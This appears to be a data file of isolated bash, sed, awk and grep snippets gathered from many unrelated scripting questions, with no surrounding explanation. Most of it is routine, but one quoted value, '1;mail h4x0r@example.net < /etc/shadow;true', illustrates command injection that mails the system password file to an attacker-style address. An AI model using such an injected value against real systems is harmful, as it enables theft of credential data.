mp4_file= find \working -type f -name "*.mp4" | head -1
srt_file = find \working -type f -name "*.srt" | head -1
mencoder -oac pcm -ovc raw -sub $srt_file -utf8 -o $mp4_file-SRT $mp4_file
HandBrakeCLI --preset "High Profile" -i $mp4_file-SRT -o $mp4_file
ls -lrt | awk ' !/dly/ { print $NF } ' | awk ' /000001.txt.gz/ { print } '
ls -rt
set -e
set -e
time (...)
set -e
set -e
set -e
set -e
( )
( )
set -e
set +e
set -e
\( ... \)
grep -E '\b([[:alpha:]]) *\1 *\1 *\b' words.txt
find $HOME -type f -name "*.c" -size +2000c
aconv ... && rm "$1"
svn mv
for sd in /dev/sd[b-z] ...
find -type d -name 'oldFolderName'
find . -depth -type d -name 'thefoldername*' -execdir mv {} newfoldername \;
for i in $(find . -type d -iname '1100');do echo "mv "$i" "$i"__" >> test.txt; sed 's/1100__/2200/g' test.txt > test_1.txt; bash test_1.txt ; rm test*.txt ; done
( ... )
sed -i
while read filename; do
tar -xOf file.tar "$filename"
| grep 'pattern'
| sed "s|^|$filename:|";
done < <(tar -tf file.tar | grep -v '/$')
while read
info man
info tar
tar xf test.tar $FILE
for i in
while read
hello ugly world
sed 's/<?php\n$r = session_start();/<?php\nheader...
2>> /dev/null 1>> /dev/null &
chsh -s /bin/bash
man bash
a.com b.com c.com
*.a.com *.b.com *.c.com
-t test
./my-script | grep foo
for IP in 'sqe 6 250';
CTRL + C
CTRL + C
CTRL + C
ping stockoverf^Cping stackoverflow.com
ping stockoverfping stackoverflow.com
ping stackoverflow.com
export FOO
export FOO_BAR_BAZ
GNU find
GNU sed
man -s8 useradd
$oct <= 255
sh.exe": C:\Program: No such file or directory
sh.exe": C:\Program Files (x86)/Microsoft\ Visual\ Studio\ 10.0\Common7\ide\vbexpress.exe: No such file or directory
C:\Program Files (x86)/Git/build
time locate IMG_0772.JPG
man updatedb
ls: blabla.rar: No such file or directory
cat $#
{} +
{} +
man find
find --version
[ ... ]
cat -v
grep -A8 -E '^11:'
foo 'file[1-3]'
file1 file2 file3
qsub pressure.sh
egrep -v
tail -f /var/log/apache2/access.log | grep --line-buffered "something"
tail -f /var/log/apache2/access.log | sed -une "/something/p"
tail -f | grep
File (or Shell) -> New Command
open -e .profile
bash --noprofile
eval ...
echo $i
ps -p
shopt -s extglob
[ $depth -eq $zero ]
[ -eq 0 ]
if [ -z ] ; then echo "true"; else echo "false"; fi
xyz=""; if [ -z "$xyz" ] ; then echo "true"; else echo "false"; fi
unset xyz; if [ -z "$xyz" ] ; then echo "true"; else echo "false"; fi
(( ... ))
[[ ... ]]
number_of_columns = 3
selected_columns = [2 5 8]
awk: cannot open 0.000E+00 (No such file or directory)
ls -lv
-t '_'
-k 2n
sort -V
echo "$out" >> "outFileName"
sed -i "s/${str}/${newSeed}/g"
grep -E
grep -E
[[ file1 -ot file2 ]]
date +%Y%m%d%t
D= date +%Y%m%d%t
echo -e "   abc   \t def  "|column -t|tr -s " "
column -t
tr -s " "
cat - -A
echo -e "   abc   \t def  "|cat - -A
abc   ^I def  $
echo -e "   abc   \t def  "|column -t|tr -s " "|cat - -A
abc def$
how to remove extra spaces
$ENV{'PATH'} = $ENV{'PATH'}.":"."/additional/path";
seq $last -1 2
{$last .. 1}
Mintty 1.1.2
ISO-8859-1 (Western European)
date > file_$i
chop $F[-1]
GNU sed
cd "$S3"
ls */*.png
[ -d "$S3/$next" ] || mkdir -p "$S3/$next"
CR LF
http_proxy ftp_proxy https_proxy ...
Oct 27 07:59:46 myhostname my-service: my-service: fatal: failed to become a daemon: Resource temporarily unavailable
daemon --name=my-service --running --verbose
sleep a second
for f in *.php
head -5
done > PHP_header
#!/usr/bin/env ruby
find . zad*
find . -name zad1.sh zad2.sh zad3.sh ...
sort input|uniq
do to what
do to to what
export -f nvm ; make mytarget3
sort -- -r
unexpected token `('
if [ -f "path-to-my-file" ]; then ...
find . -type f | xargs -n1 grep "Hello" -c
-type f
wc -l
$currentDir/$1/Contents/MacOS/applet $2
if (count argv) is less than 1 or (count argv) is greater than 1 then
grep -l "If you wish to distribute" *.pdf
-d ''
".*No such process.*"
ssh -2 -l root devserver "cd /var/log/httpd; ls | grep -v 'gz' | xargs -- tail -n 15"
<?php ?>
src="<?php echo $baseUrl?>/css
href="<?php echo $baseUrl?>/Login
man 3 chmod
num count
[num, num+histogram_precision)
[0.5, 1.5)
[1 2)
v > current_bucket + histogram_precision / 2
GNU awk
workon venv
mkvirtualenv venv
/path/to/venv/bin/python script.py
$ source script_name
kill -SIGUSR1
trap ...
source shell.sh
. shell.sh
which: shell built-in command
which which
while read line
dos2unix filename
bash -r
sed -r 's/192\.168(\.??[0-9]*){2}/192.168.15\1/g'
sed -r 's/192\.168(\.??[0-9]*){2}/192.168.15\1/g' network.conf
sed -r -i 's/192\.168(\.??[0-9]*){2}/192.168.15\1/g' network.conf
Content-Transfer-Encoding: base64
if ... elif ..fi
'egrep "&|\"|:|'
'" | wc -l'
$( )
seq 0 127
xargs printf '\\x%x '
xargs printf '%b '
source ~/.bash_profile
GNU awk
Ctrl + C
kill -$$
su synesty
su synesty -c "screen -dmS appscreen ./eclipse -vmargs -DAPP_ENV=$automatey_note \$vmargs"
echo "N" | wine BERCon.exe
GNU awk
GNU sed
-i | )
echo "$match"
man test
[ "$item0" = "$item1" ]
if true then echo foo fi fi
foo fi
git fetch
git fetch --dry-run
git fetch --dry-run
sed s/{{VALUE}}/$(value)/g
sh script
chmod+x script.sh
echo The regex matches!
-f /var/tmp/list_of_ip.txt
grep -E
zgrep (gzip) 1.3.12
grep (GNU grep) 2.5.1
command not found
declare -f geta getx
man for
svn info --revision HEAD
svn info --revision HEAD
myscript 2>&1 >/tmp/script.log
echo -e
echo -e
your_program with arguments
diff testfiles.txt tested_files.txt
./user.sh username filename
done < "$INPUT"
echo "cp Rubric.pdf ./Grades/$flname_rubric.PDF"
GNU awk
info date
+......+......+......+..... word
+.... word
GNU awk
for cc in ...
recode iso885915..utf8 thisfile
for; do; done
$. ./cntps.sh
wc -l
ps -e ...
$. ./cntps.sh
sh -c 'path/to/cntps.sh'
`ps -ef | ...`
echo filename
in "$@"
for i
echo $formatb_dir
dirname $somefile |tr '\n' "/"
C-x e
C-x e
# -*- mode: sh -*-
>> time.txt
Syntax error: "(" unexpected
sleep 2
hold: true
info time
(time sh -c "./program.exe") 2>&1 | grep "real" | awk '{print $(NF)}'
{ .. }
{ .. }
ipconfig /all
route -n
edquota -p user1 -u user2
cp -r
su - username
ln -s
man bash
sh -c
chmod a+x /git/sitename.git/hooks/post-receive
cat -v
-name \*.csv
find . \( -name "*.cvs" -o -name "*.CVS" \)
-iname '*-csv'
shell connector
shell connector
shell connector
{1..157} / 42
answer to the ultimate question of life, the universe, and everything
shell connector
find . -name '*.mp4' | wc -l | xargs -I{} expr {} / 2
man bash
su -c "mkdir bin" $USER
No such file or directory
String sciprtPath  = System.getenv("MY_SCRIPT")
gzip -9 -r folder
make 2&>1 | less -R
inotifywait -R
make 2&>1 /output/file
tail -f /output/file
Osiris JL:
-name 'm?'
sh -c "..."
cat /Users/...
try --help
sleep 10
man test
/sbin/mdadm -IRs
man bash
/sbin/mdadm -IRs
help test
./yt.pl youtubeLink
./yt.pl http://www.youtube.com/watch?v=KYzUd95h8X4
exec bash
set +x
set +x
cp $tmp $file
sed -i -f sed.script $file
man bash | grep "\-d"
man bash | grep " \-d"
" \-d"
43     300    2611
12     118     855
man bash
test -v
test -v foobar[bar]
set +u
test -v
test -v foobar[foo]
echo $!
echo $!
if (!words[$i]++) printf ";%s",$i
read [-ers] [-a aname] [-d delim] [-i text] [-n nchars] [-N nchars] [-p prompt]
[-t timeout] [-u fd] [name ...]
-a aname
-d delim
-i text
-n nchars
-N nchars
-p prompt
-t timeout
-u fd
sed -n
adduser  --gecos
if [ -n "$2" ]; then
source bash_ipc_demo
back_func start
-g 3600
-g 3600
kill -s USR1 -- $$
help trap
bash -c
export FOO="bar"
I love
I love
Suzi and Marry
I love Suzi and Marry
[ "${f%$t*}" != "$f" ]
I love
and Marry
I love Sara and Marry
1 file
2 files
3 files
print('text', end='')
print 'text',
man cron
s/ (([0-9]+\.){3}[0-9]+) +(.*\.doc) / \1\n\3\n/
test_echo $@
bad array subscript
[ -n ${haystack["$needle"]+found} ]
bash  /tmp/test.sh -c -l /tmp/aaa -php "aaa.php -d -p 3 -f 2012-10-23"
xterm -e
konsole -e
gnome-terminal -x
exit 0
exit 1
mplayer "$vid"
prun 15 foo.sh
sh -c
O = 2
e x i t
echo 'mysqldump --defaults-file=/etc/mysql/debian.cnf dbname' | ssh -t -i keys/id_rsa -l foo example.com sudo bash -s
Pseudo-terminal will not be allocated because stdin is not a terminal.
ssh -i keys/id_rsa foo@example.com sudo bash -c "'mysqldump --defaults-file=/etc/mysql/debian.cnf dbname'"
'mysqldump --defaults-file=/etc/mysql/debian.cnf dbname'
sh scriptname.sh
ls -l
ls -al
getfacl file.sh
head -n 1 file.sh | xxd
ls -l /bin/bash
getfacl /bin/bash
ls /proc/sys/fs/binfmt_misc
for i in $(find ...)
file="name containing "quote characters""
name containing quote
while read -d $'\0' i
cd "$loc"
sed 's/^ *//g'
test foo bar
foo bar
read line
col -b
whois uio.no
whois tasvideos.org
( ... )
{ ... }
bash -i
id -P
id -P
id -P
$( )
id -F
is a
.+?; /s; ...
Here is a String Here is a second String
export VAR
. ./yourscript.sh
ls img.*
"-- stat"
flock -n
[[ -f *.suite ]]
/bin/bash --version
@($(echo $test))
matched - pattern1
matched - pattern2
didn't match
./myScript.sh | filter_escapes | tee outfile.log
ls --color=always
tee >(sed .... > logfile)
sed 's/.$//'
echo -e
echo "-n"
echo -n
echo "-n"
help echo
pidof zsh
killall -s 0 zsh
ps aux | grep ProcessName
screen -S ROBUST -p 0 -X eval 'stuff "create user SomeUser SomeName SomePass somebody@somewhere.com ^M"
git clean
git pull
cd ./project_one
find . type -d -name .git ...
monitor_directory "/tmp"
monitor_directory.sh "/tmp" "10"
echo ls
<( ... )
<(echo 'stuff')
man 2 mmap
set -f
parameter expansion
command substitution
arithmetic expansion
pathname expansion
pathname expansion
man bash
help set
echo $query
tee temp.txt
set -f
"1;mail h4x0r@example.net < /etc/shadow;true"
echo 5+6 | bc
bc <<< "5 + 2"
$2 in check
file2 file1
text number
apt-get update -q
export PATH=$PATH:currentdir+somethingelse
sdir myproject
gdir myproject
pushd and popd
gdir myproject
[[ $lines > 4 ]]
[[ ]]
[[ $lines -gt 4 ]]
(( lines > 4 ))
$ . scp.sh
$ ./scp.sh
< foofile.txt
mkdir -p
git branch
echo *
echo develop *  master
sh idea.sh
sh:Can't open idea.sh
$ idea.sh
$ sh idea.sh
ls -size +10k
find . -size +10k -exec ls -lh {} \+
ls -lh
ls -l found.file; ls -l found.file.2; ls -l found.file.3
ls -l found.file found.file.2  found.file.3
ls -ls
sort -n
find . -size +10k -exec ls -ls {} \+ | sort -n
find . -size +10k -exec ls -ls {} \+ | sort -nr
find . -size +10k -exec ls -ls {} \+ | sort -n | tail -1
find . -size +10k -exec ls -lS {} \+ | head -1
sort -n
Profile preferences
.[^.]* *
date +%-d
echo $($cmd)
find . -name "*.sh"
chmod +x
echo "the return code:$?."
the return code:4.
if [ $? -eq 5 ]
if [ $? -eq "5" ]
if [ $? == 5 ]
if [ $? == "5" ]
if [[ $? -eq 5 ]]
if [[ $? -eq "5" ]]
if [[ $? == "5" ]]
if [[ $? == 5 ]]
[ $? -eq 5 ]
head -3
cat FILE.csv| head -11
read host
if [ false ]; then echo 'ok'; fi;
ok=false; if [ $ok ]; then echo 'ok'; fi;
if [ false ]
if [ -n "false" ]
if false
ls | wc
 ... | tee log-file | grep options
man bash
man sleep
vim ~/.bash_profile
export PATH=/usr/local/bin:$PATH
export PATH=/Applications/MAMP/bin/php/php5.5.10/bin:$PATH
sudo apt-get install expect
yum install expect
elif [ $die > 1 ]; then
elif [ $die -gt 1 ]; then
if [ $p2s > 99 ]; then
if [ $p2s -gt 99 ]; then
tail -f
bundle exec
script/rails server
rails s
bash -i
set -m
man bash
[ $choice == r ]
ssh hostname './remove'
shopt -s extglob
rm -r !(Desktop|Downloads|Videos|Pictures)
$> ./X.sh
chmod +x printmeself
scp /tmp/sshf.sh $SERVER:~
ssh $SERVER cat ~/sshf.sh
echo hello
echo 2^5
echo 2\5
echo 25
echo 2^^^^5
echo 2^5
echo 2^^5
sed 's/false/true/g'
sed 's/\(^.*conf\[.*\] =\) false/\1 true/g'
sed -i 's/\(^.*conf\[.extra_login_security.\] =\) false/\1 true/' /usr/share/phppgadmin/conf/config.inc.php
sed 's/\(^.*conf\[.extra_login_security.\] =\) false/\1 true/' > mynewfile.php
sed 's/\(^.*conf\[.extra_login_security.\] =\) false/\1 true/' | sudo tee mynewfile.php
man tee
rmdir *
invalid argument
shc -rf <filename>
COMMAND="$CMD -p $PORT -l $LISTEN_IP -m $MEM_SIZE -v"
ps -ef | grep -v grep | grep $( cat $PID )
grep -v grep
$( $command )
cat $PID
sleep 2
kill -9
ps -ef | grep -v grep | grep $CMD | grep -w $USR | awk '{print $2}'
ps -ef
grep -v grep
grep $( cat $PID )
if ... else ... fi
cd ../
/bin/bash --version
check function
syntax error: ';' unexpected
for (( ... ))
awk -F "|" '{if ($0 == "@") {print $0} else {;if ($0 == "\#") {print $0} else {;if (NF == 10) {print $0};}}}' infile.txt > tens.txt
(NF == 10)
sed 's/fields/fields\nNew Inserted Line/'
sed -i 's/fields/fields\nNew Inserted Line/'
xargs -0
git add
sed -i.bak 's/^option.*/option newparam/' somefile.conf
sed -i.bak "s/^#$STR.*\|^# $STR.*\|^$STR.*/$OPT/" $FILE && grep -q "^$OPT" $FILE || echo "$OPT" >> $FILE
grep -q '^option.*' file.txt || echo 'option newparam' >> file.txt
option newparam
> >
ps -eaf | grep 11211 | grep memcached
ps -ef | grep memcached
cat ... >> $TARGET
chmod a+x /usr/local/bin/memcached_autostart.sh
netstat -p
day of month
day of week
cat input | sed -r 's/ *([0-9]+).*/\1/'
| xargs perl -e 'for($c=0;$c<=$#ARGV;$c++) {print ($ARGV[$c] . ": " . $ARGV[$c] * 3 . "\n");}'
for($c=0;$c<=$#ARGV;$c++) { ... }
print ($ARGV[$c] . ": " . $ARGV[$c] * 3 . "\n");
exec grunt grunt.js
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'
ifconfig wlan0 | ...
alias myip="ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'"
hostname -I
hostname -i
default route
ip route get 1 | awk '{print $NF;exit}'
$ hostname --ip-address 2> /dev/null || (ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p' | awk '{print
LOCAL_HOST := ${shell hostname --ip-address 2> /dev/null || (ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p' | awk '{print $1; exit}')}
ifconfig | grep 'inet addr:' |/usr/bin/awk '{print $2}' | tr -d addr:
hostname -I
npm install -g ip && node -e "const ip = require('ip'); console.log(ip.address())"
route get to
.*src \([0-9.]\+\).*
ip route get 1
ip route get to 1.0.0.0
curl -u "$REPORTER":"$TOKEN" https://api.github.com/repos/$OWNER/$REPO/issues -d @$JSON_WITH_ISSUE
a=(1 2 3 4 5)
b=(12 23 21 2 3)
GNU parallel
accuracy.sh tmp1 tmp2
sudo "$0" ...
if [[ $(find path/to/dir/*[^thisdir] -type d -maxdepth 0) ]]
[ -e $var ]
/bin/bash -l -c "<command>"
rcommand lsh
set -x
chmod +x test_args
Command not found
TRACES = $('\Traces')
No such file or directory
SELECT fileid FROM files
SELECT filedata FROM files
./steam -command update -game "Counter-Strike Source" -dir .
./steam -command update -game "Counter-Strike Source" -dir . | tee log
ls *.zip
find . -name "*.zip"
grep -o -E "(\\.([A-z])+)+"
grep -o -E "\\.([A-z])+$"
$<something> = '<value>'
zstyle ':completion:*' completer
find ~/Dropbox/Backups/casper/* -mtime +0.5 -exec rm {} \;
path === "asd"
if [[ "$1" == "-v" ]]; then
&lt;script type="text/javascript" src="javascript/scripts.js"/&gt;
man [
GNU sed version 4.2.1
result = [qstat(cluster) for cluster in Vector]
sort -t "," -k1
http://site.com/go/to/somelink,9/16/2012 8:19:00 AM
declare -g foo=bar
local -g foo=bar
local foo=bar
declare foo=bar
declare -r foo=bar
local -r foo=bar
readonly foo
foo() { echo bar; }
foo { echo bar; }
function foo() { echo bar; }
function foo { echo bar; }
def foo { echo bar; }
final foo
var foo=bar
val foo=bar
var -g foo=bar
val -Ai foobar=([foo]=0 [bar]=1)
rails -v
rails -v
sudo gem install bundler
bundle install
ssh postgres@hostname psql dbname -c SQL_COMMAND
SQL_COMMAND="SELECT 'aaa'"
psql -c "$SQLCOMMAND"
$( ... )
_$1() { func body ; }
dog cat bat ant
GNU grep
head -1
grep -o
head -1
[[ ! -v 1 ]]
cut -f1,3,50- file
echo $((10#${VAR}))
date +%e
date +%e
-F', '
> reversed_columns
FS=",[ ]*";
a, b, c, 1337, d, e
a,  (many spaces)   b, c,1337,d,     e
OFS=", "
for (i=NF; i>0; i--) { ... }
if (i>1) { ... }
printf "\n"
git branch -mv 2-dev-inprogress 2-dev-wip
source ~/.git-completion.bash
git remote | xargs -n1 git remote prune
crontab -e
xmlstarlet ed --help
exec ${co[1]}>&-
exec 3<&${COPROC[0]}-
fd 3
"Foo 001.png"
"Foo 002.png"
cat filenames
ls -1 *.jpg
ls -1v
php -f test.php A B C defgh
result_code=mvn deploy
$ head --lines=-N file > new_file
man 1 tac
wc -l <file>
head -n <total lines - lines to remove> <file>
for i in $(seq 1 3); do sed -i '$d' file; done;
head -n -5 file
set -o vi
($PROGRAM &) &>/dev/null
gnome-terminal --comand 'yourapp'
chmod +x
emacs -nw
printf "%b" "\u"
kill SIGNALS
readlink -f .
-type f
-type d
-mindepth 1
find ~/test -type d -mindepth 1
find ~/test -type d
-exec basename {} \;
-mindepth n
-(min|max)depth n
..."value=" i ); i+=5; print
(( expression ))
let expression
chsh -s /bin/bash
bash --login
<br />
git push REPO --progress 2>&1
git push REPO --progress > /path/to/file 2>&1
man 8 logrotate
echo -e $mail | /usr/sbin/sendmail -t
To: someone@example.com someother@nowhere.example
echo -e "To:receiver1@domain1, receiver2@domain2 \nSubject:Subject of email \n\nBody of email.\n" | /usr/sbin/sendmail -f sender@domain -F sendername -it
eval $(ssh-agent)
grep c foo.txt
-B <number>
-A <number>
$( ... )
ls > log.csv
file1.txt,file2.txt, ... fileN.txt
2>&1 zypper -x -n in geany | grep -o --line-buffered "percent=\"[0-9]*\"" | tee /var/log/oneclick.log
1f 8b
1f 8b
source template.sh > /path/to/file
pushd +1
pushd -0
popd +0
pushd -0; popd +1
p <letter>
p m
p w
p c
p con
p c
p c
p c
p q
pushd <directory_name>
p v
sleep 20;
sed -i
,[anything, even blanks],[dog|log|frog],[dog|log|frog],[0|1],[0|1],[0|1]
find /data -type f -perm 400 -print -quit
-exec echo Modifying {} \; -exec chmod 755 {} \;
while read
while read
-d $'\0'
which [
exec chroot [dir] cd [subdir]
man test
if test -f filename; then foo bar; fi
if test -f filename
if [ -f filename ]
if [ $STATUS -ne 200 ] -a [[ "$STRING" != "$VALUE" ]]
foo && bar
if foo; then bar; fi
foo || bar
if ! foo; then bar; fi
[[ foo =~ ^f ]]
[[ 10 < 2 ]]
$(( 10 < 2 ))
(( status != 200 ))
-type f
-name "??????*"
-type f
-size +5c
find . -type f -regextype posix-egrep -regex ".*/[^/]{5}[^/]+$" -exec rm -vf {} \;
find .
-type f
-regextype posix-egrep
-regex ".*/[^/]{5}[^/]+$"
-exec rm -vf {} \;
find: missing argument to '-exec'
-exec rm -vf {} \;
-exec rm -vf {} \;
groff -ms -Tps ctlseqs.ms | ps2pdf - ctlseqs.pdf
help wait
for file
grep -q pattern file && do_something
echo >&2
[[ ! -f "$file" ]]
files+=( "$file" )
[ ! $status ]
status=$(command >& /dev/null)
file ...
if [ $? -eq 0 ]
if (($? == 0))
__git_mergetools_common=$'diffuse ecmerge emerge kdiff3 meld opendiff\n\t\t\ttkdiff vimdiff gvimdiff xxdiff araxis p4merge\n'
enter code here
2>> $HOME/somefile
cat -
>> [file]
 find -name *{.GIF,.gif}
find -name *.GIF *.gif
-name file_BSD.GIF  file_linux.gif
type vimdiff
which vimdiff
--side-by-side --suppress-common-lines --ignore-space-change
nedit abc.c
ne file.txt
crontab -e
echo "00 03 * * * root backup.sh" >>/etc/crontab
echo "00 03 * * * root backup.sh" >/etc/cron.d/mybackupjob
crontab -l >tmp; echo "00 03 * * * backup.sh" >>tmp; crontab tmp; rm tmp
exec <language>
sudo -s
echo "here is $var"
echo "here is $(echo ${var})"
diff <(ls dir1) <(ls dir2)
man ssh-keygen
source ./myScript.sh
. ./myScript.sh
$' '
# ./inot.sh &
read dir ev
read dir ev file
help read
touch zzzhey.txt
vim zzzhey.txt
rm zzzhey.txt
-e delete
subscript1=source "${DOCROOT}/script1.sh"
array=(${subscript1} ${subscript2} ${subscript3});
$TOMCAT_HOME/bin/catalina.sh stop
$( ... )
echo $(echo one $(echo two ) )
${status} == *idle*
if ... fi
case ... esac
cmd ... 2>/dev/null
if condition; then action; fi
1 N
< <(
:w !command
tail -f -n 0 Internals/servout &
id=SELECT...FROM...WHERE path LIKE ""
cat $f
(SELECT ...)
standard_conforming_strings = on
echo "$f"
<p>Blah blah <b>blah</b>...</p>
google-chrome http://www.google.com/
<( )
<( )
diff <(echo "$foo") <(echo "$bar")
echo foo
spawn bash
make install
mkdir $(date +"%d-%m-%Y")
mkdir "backup_$(date +'%d-%m-%Y')"
mkdir $(date +'backup_%d-%m-%Y')
"$(dirname "$0")"
unexpected end of file
uniq file
[ ]
$TARGET_KEY = $REPLACEMENT_VALUE
{printf "%s",$0}
$0~"</AA>" {print}
exec $0
export PS1="\360\237\232\251 > "
echo -e
git mv {,partials/}_fav-locations-cluster.html.erb
find /home/feeds/data
-type f
-not -path "*def/incoming*"
-not -path "*456/incoming*"
-not -path
| grep myFile.txt
-not -path '*/\.*'
-type f
grep 'rpm -qVa | awk '\''$2!="c" {print $0}'\' filename
grep $'rpm -qVA | awk \'$2!="c" {print $0}\'' filename
grep 'rpm -qvA | awk .$2.="c" {print $0}.' filename
grep 'rpm -qvA | awk .$2[^=]="c" {print $0}.' filename
grep -Hn "text" . | awk -F: '{print $1 ":" $2}'
man stat
help stat
cut -d ' | ' -f3,5 myfile.txt
awk '{print $1," | ",($3+$5)'} myfile.txt
OFS="| "
{print $1 OFS $2+$3}
set -e
set -e
cmd || exit 1
set -e
set -e
set +e
set -e
set -e
trap ERR
set -e
apt-get install fortunes-bofh-excuses
$$, $PPID, $PWD
set -e
|| true
misspeled-command | sed -e 's/^WARNING: //'
find <path> -newer
find /tmp -newer /tmp/abc.txt
find /home/zzz -type f
find /home/zzz/ -type f
a b
c d
man bash
IFS=: read -a array < <(...)
stat 'the-filename' --format=%s | grep '^0$'
/usr/sbin/lsof /path/to/zip/abcd.zip
$? 0
$? 1
$? -eq 0
exit $?
echo $!
exec my_script.sh 123 456
echo "$line" | tr -d '\n'
echo -n
grep -r LOC: *
END{print sum}
grep -o -E '\<[-A-Za-z0-9.]*\>'
IFS=$' \t\n'
cat players.txt | grep -E ' .[0-9]_\('
' .{0,9}_('
string=$(cat fileB)
sed "s/XXX/$string/g": use
to replace all occurrences of
with what is inside the variable
. (The
< fileA
> fileC
gcc bartab.c -o bartab
echo -n
while IFS= read -r line; do #stuff with $line; done < file.txt
-mtime +10
-type f
ls /home/File.txt
man [
-z string
GNU awk
-c 5
GNU awk
[[ ]]
Pseudo-terminal will not be allocated because stdin is not a terminal
ssh ... [user@]hostname [command]
export USER=xxx
it is a long code
kill -9 <PID>
kill <PID>
grep -h MachineName $(grep -l OS=XP  181*)
SHELL = /bin/bash
file Makefile
tr -s
echo 'long register dump'
grep_result=$(grep -r $ID .)
grep -r $ID .
if [ -z "$grep_result" ]; then
grep_result_count=$(grep -rc $ID .)
if [ $grep_result_count -eq 0 ]; then
grep -q
grep -c
$command_name hello world
echo hello world
paste -d"\0" <(cut -c1-10 $DPath/named.query.log | sed 's/\-/:/g') <(cut -c11- $DPath/named.query.log)
{printf "%s", $0}
!/\$\{myapp\.base\}\/bin/ {printf ",${myapp.base}/bin"}
{print ""}
input_file > output_file
./my_spcript.sh 'a b c d'
a b c d
a b c d
while(p.getInputStream().read() != -1);
-classpath /path/to/classes:.
grep --color=always
grep "test" *
grep -r "test" *
grep test *
grep test *
grep test *
grep test prova.txt
grep test
grep -r [pattern]
tar -c -f - -T -
-f -
-T -
GNU awk
sed 's/.*/"&"/'
if [ ASDFA23RASDF29ASDJ29DJ2 == ]; then
remoteString=$(awk ....); echo $remoteString
awk ....
--rcfile file
while read LIST do ... end
while read LIST do ... end
"s/@program/@program ${ID_VAR}/"
@program (value of ID_VAR)
echo '@program' $(grep "id" file/one | cut -d " " -f2) >> file/two
which [
help [
man bash
a b
a  b
read -a
head -1 data.txt
grep -o 'Samp[0-9]*'
$ head -1 data.txt | grep -o 'Samp[0-9]*' > samps.txt
$ head -1 data.txt | grep -o '\w*' | tail -n +3 > samps.txt
grep -o '\w*'
tail -n +3
array1 = (AAA BBB CCC DDD)
array2 = (001 002 003 004)
if ...
head -n 5
./launcher --start
./launcher --stop
./daemon.sh --start-the-real-thing
./daemon.sh --stop-the-real-thing
"ssh your_user@ssh_server ls /"
$updateNum= 1
variable=$(echo $variable | sed -E "s/[0-9]+?/$updateNum/")
floor(222/5) == 44 weeks
44 weeks * 7 days per week == 308 days
222 % 5 == 2
222 working days == 310 regular days
echo "${name} has ${name}_${item} ${item}"
"user bob has fancy pants"
"user bob has bob_pants pants"
sleep 10
100 - idle%
chmod +x clean_de.sh
find . -name "*.*.*
echo $oldName | rev | cut -f2- -d'.' | rev
mv $oldName $newName
~/Restore -n
grep $2 ~/store
grep ~/store
./update_newdateformat.sh: line 20: 12=01: command not found ./update_newdateformat.sh: line 23: 12=: command not found
rm -f
shopt -s nullglob
grep '<swid:' inputfile | sed 's/<\/.*//'
ps aux | grep -w -e cat -e head
ps aux | grep -w -e cat -e head
cat | head -n 1
head -n 1
head -n 1
cat | head -n 1
sed -n 1p filename
sed '1!d' filename
>f+++++++++ file1
>f..T...... file1
>f.sT...... file1
prog1 | prog2
wget http://host/password.txt
|| :
|| :
|| true
#!/bin/sh -e
set -e
|| :
|| true
man rename
typeset -n
if [[ $1 =~ "foo.*bar" ]] ; then
( )
[[ X ]]
[[ a < b ]]
[ a \< b ]
expr x"$x" \< x"$y" > /dev/null
[ "$(expr x"$x" \< x"$y")" = 1 ]
[[ a = a && b = b ]]
[ a = a && b = b ]
cmd1 && cmd2
[ a = a ] && [ b = b ]
[ a = a -a b = b ]
[[ (a = a || a = b) && a = b ]]
( )
[[ && ]]
[[ || ]]
[ ( a = a ) ]
[ \( a = a -o a = b \) -a a = b ]
\( \)
{ [ a = a ] || [ a = b ]; } && [ a = b ]
[ a = a ] || [ a = b ] && [ a = b ]
[[ || ]]
[[ && ]]
x='a b'; [[ $x = 'a b' ]]
x='a b'; [ $x = 'a b' ]
[ a b = 'a b' ]
x='*'; [ $x = 'a b' ]
x='a b'; [ "$x" = 'a b' ]
[[ ab = a? ]]
* ? [
[ ab = a? ]
[ ab = a\? ]
case ab in (a?) echo match; esac
[[ ab =~ 'ab?' ]]
[[ ab? =~ 'ab?' ]]
[[ ab =~ ab? ]]
[ a =~ a ]
printf 'ab\n' | grep -Eq 'ab?'
awk 'BEGIN{exit !(ARGV[1] ~ ARGV[2])}' ab 'ab?'
[[ ]]
[[ ]]
sudo bash filename.bat
source ~/.bashrc
shell -$SHELL
expr "2" "*" "2"
expr "2 * 2"
expr "${ELEMS[*]}"
set -o pipefail
bash -c 'set -o pipefail && command1 | command2 | command3'
ln -s "/cygdrive/c/Program Files" /cygdrive/c/ProgramFiles
cd -
bash --version
ssh-keygen -p
man isspace
psql -a -e -d users -U postgres --no-align -F$'\t' -c "select * from users limit 1;" > file.ext
select * from users limit 1;
"${PSQL[@]}" "${QUERY}"
od -abc <<< "$IFS"
flock -e 200
bash -f
man bash
man bash | col -b >bash.txt
$(< file)
read -p
shopt -s globstar
curl http://localhost/mysite
curl http://127.0.0.1/mysite
curl http://mysite.com
$ curl -v http://localhost/mysite
curl -v --noproxy localhost, http://localhost/muestra
alias curl='curl --noproxy localhost,127.0.0.1'
echo "alias curl='curl --noproxy localhost,127.0.0.1'" >> ~/.bashrc
man find
param1 param2, param3
param1 param2
tail -f pipe > outputfile
bash file
bash -i file
#!/usr/bin/env bash
chmod +x
git pull
[remote "origin"]
sed -i s/^1/one/ data
sed -i s/^2/two/ data
| bash
su - demo
set -m
trap '' SIGINT SIGTERM EXIT
sleep 30
while true
sleep 1
echo $i $j >> /tmp/file
echo $i $j >&3
exec 3>/tmp/file
>> /tmp/file
seq | while read
'{printf "%0.1f", $14}'
sed --posix
field separator
$2 < 100 {print}
$2 < 100
trunc filename
ps -udavid
ps -udavid -o %cpu
tail -n +2
paste -sd+ -
python --version
hash -d python
help printf
awk -F'[. ]' '{ if (a[$2]++ == 0) print }'
dd if=~/test/File01 >> ~/dustbin/File01
while read...
< $file
while read...
send=$(last -n 1 $1 | awk '{print $1 " " $2}')
send=$(last -n 1 $1 | awk '{print $1 FS $2}')
awk 'BEGIN{FS="\""}
{print $14}'
<<< "${var}"
What about the classic sed solution?
